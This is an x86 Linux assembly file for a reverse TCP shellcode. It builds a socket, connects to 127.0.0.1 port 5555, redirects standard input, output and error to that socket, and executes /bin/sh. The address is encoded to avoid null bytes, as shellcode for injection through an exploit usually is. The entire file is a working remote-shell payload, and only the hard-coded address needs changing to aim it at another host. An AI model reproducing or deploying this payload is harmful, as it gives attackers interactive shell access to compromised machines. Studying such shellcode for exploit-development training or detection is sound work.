global _start

section .text 

_start: 



; 1) Socket Creation
       
	xor ebx, ebx
	mul ebx
	mov al, 0x66 ; socketcall 102 → Hex: 0x66
        mov bl, 0x1 ; SYS_SOCKET 1
        push edx ; protocol = 0
        push ebx ;  SOCK_STREAM = 1
        push 0x2 ; AF_INET = 2
        mov ecx, esp ; stack pointer to ECX
        int 0x80 ; Execute SYS_SOCKET
        mov edi, eax ; save socketfd to edi
        
        mov eax, 0x02010180  ; 2.1.1.128 (*Little-Endian) to avoid null 
	sub eax, 0x01010101  ; Subtract 1.1.1.1
	push eax             ; sin_addr = 127.0.0.1
        push word 0xb315     ; port = 5555 
        push word 0x2        ; AF_INET = 2
        mov esi, esp         ; Move stack pointer to ESI

        



        ;connect
        xor eax, eax ; zero eax
        xor ebx, ebx ; zero ebx
        mov al, 0x66 ; socketcall 102 → Hex: 0x66
        mov bl, 0x3 ; SYS_CONNECT 3
        push 0x10 ; sizeof(addr)
        push esi ; ESI = Server Address struct
        push edi ; EDI = sockfd
        mov ecx, esp ; Move stack pointer to ECX
        int 0x80  ; Execute SYS_CONNECT

        ;dup input output
       	xor ecx, ecx
        mov cl, 0x3 ; Set the counter to 3
        loop:
        xor eax, eax
        mov al, 0x3f  ; dup2 63 → Hex: 0x3f
        mov ebx, edi  ; New sockfd
        dec ecx ;  Decrementing the counter by 1
        int 0x80 ; Execute dup2
        jnz loop ; jmp back to loop

        ;execve
        push edx ; NULL
        push 0x68732f6e ; “hs/n” ← //bin/sh
        push 0x69622f2f ; “ib//”
        mov ebx, esp ; Move stack pointer to EBX
        push edx ; NULL terminator
        push ebx 
        mov ecx, esp  ; Move stack pointer to ECX
        mov al, 0xb ; execve 11 → Hex: 0xb
        int 0x80 ; Execute SYS_EXECVE

